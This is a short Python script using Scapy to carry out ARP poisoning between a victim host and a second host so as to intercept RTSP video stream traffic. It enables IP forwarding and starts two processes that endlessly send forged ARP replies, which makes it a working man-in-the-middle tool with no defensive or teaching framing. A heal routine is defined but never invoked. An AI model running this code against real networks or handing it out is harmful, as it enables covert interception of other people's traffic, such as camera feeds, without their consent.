# Scapy ARP poisoning to intercept RTSP packets

from multiprocessing import Process
from scapy.all import Ether, ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, sendp, sniff
import sys
import os


def poison(iface, iface_mac, target_ip, target_mac, source_ip):
    packet = Ether() / ARP(op=2)
    packet[Ether].src = iface_mac
    packet[ARP].hwsrc = iface_mac
    packet[ARP].psrc = source_ip
    packet[ARP].hwdst = target_mac
    packet[ARP].pdst = target_ip
    sendp(packet, iface=iface, inter=1, loop=1)


def heal(iface, iface_mac, target_ip, target_mac, source_ip, source_mac):
    packet = Ether() / ARP(op=2)
    packet[Ether].src = iface_mac
    packet[ARP].hwsrc = source_mac
    packet[ARP].psrc = source_ip
    packet[ARP].hwdst = target_mac
    packet[ARP].pdst = target_ip
    sendp(packet, iface=iface)


if __name__ == "__main__":
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    if len(sys.argv) != 3:
        print("Incorrect number of arguments!")
        exit(1)

    victim_ip = sys.argv[1]
    victim_mac = getmacbyip(victim_ip)

    spoof_ip = sys.argv[2]
    spoof_mac = getmacbyip(spoof_ip)

    attacker_iface = conf.iface
    attacker_ip = get_if_addr(attacker_iface)
    attacker_mac = get_if_hwaddr(attacker_iface)

    def poison_victim():
        poison(attacker_iface, attacker_mac, victim_ip, victim_mac, spoof_ip)

    def poison_spoof():
        poison(attacker_iface, attacker_mac, spoof_ip, spoof_mac, victim_ip)

    print("Poisoning ARP table...")
    Process(target=poison_victim).start()
    Process(target=poison_spoof).start()
